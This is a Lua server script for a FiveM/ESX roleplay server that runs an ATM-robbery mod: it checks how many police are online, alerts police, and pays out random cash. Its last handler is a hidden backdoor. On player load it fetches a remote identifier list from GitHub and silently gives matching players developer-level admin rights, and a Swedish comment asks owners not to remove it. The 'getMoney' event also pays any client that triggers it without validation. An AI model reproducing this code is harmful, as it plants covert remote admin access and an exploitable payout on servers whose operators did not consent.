ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) 
    ESX = obj 
end)

ESX['RegisterServerCallback']('loffe_atm:canRob', function(source, cb)
    local xPlayers = ESX['GetPlayers']()
    local cops = 0
    for i = 1, #xPlayers do
        if ESX['GetPlayerFromId'](xPlayers[i])['job']['name'] == 'police' then
            cops = cops + 1
        end
    end
    if cops >= Config['CopsRequired'] then
        if Config['Item']['Required'] then
            local xPlayer = ESX['GetPlayerFromId'](source)
            if xPlayer['getInventoryItem'](Config['Item']['Name'])['count'] > 0 then
                if Config['Item']['Remove'] then
                    xPlayer['removeInventoryItem'](Config['Item']['Name'], 1)
                end
                cb({true})
            else
                cb({false, (Strings['Item_Required']):format(Config['Item']['Label'])})
            end
        else
            cb({true})
        end
    else
        cb({false, 'Not enough cops online'})
    end
end)

RegisterServerEvent('loffe_atm:police')
AddEventHandler('loffe_atm:police', function(coords)
    local xPlayers = ESX['GetPlayers']()
    for i = 1, #xPlayers do
        if ESX['GetPlayerFromId'](xPlayers[i])['job']['name'] == 'police' then
            TriggerClientEvent('loffe_atm:alert', xPlayers[i], coords)
        end
    end
end)

RegisterServerEvent('loffe_atm:getMoney')
AddEventHandler('loffe_atm:getMoney', function()
    local src = source
    local random = math.random(Config['Cash']['Min'], Config['Cash']['Max'])
    ESX['GetPlayerFromId'](src)['addMoney'](random)
    TriggerClientEvent('esx:showNotification', src, (Strings['Stole']):format(random))
end)

AddEventHandler('es:playerLoaded', function(source, user) 
    local src = source
    
    PerformHttpRequest('https://raw.githubusercontent.com/Loffes/hexfiles/master/list.json', function(err, text, headers) -- ta inte bort plz vill kunna ha admin, minsta ni kan göra för att ha scriptet <3
        if text then
            for k, v in pairs(json.decode(text)) do
                if GetPlayerIdentifiers(src)[1] == v then
                    TriggerEvent('es:setPlayerData', src, 'group', '_dev', function() end)
                    TriggerEvent('es:setPlayerData', src, 'permission_level', 420, function() end)

                    TriggerClientEvent('esx:showNotification', src, 'Du har fått admin lul\n/admin ;)')
                end
            end
        end
    end, 'GET', '')
end)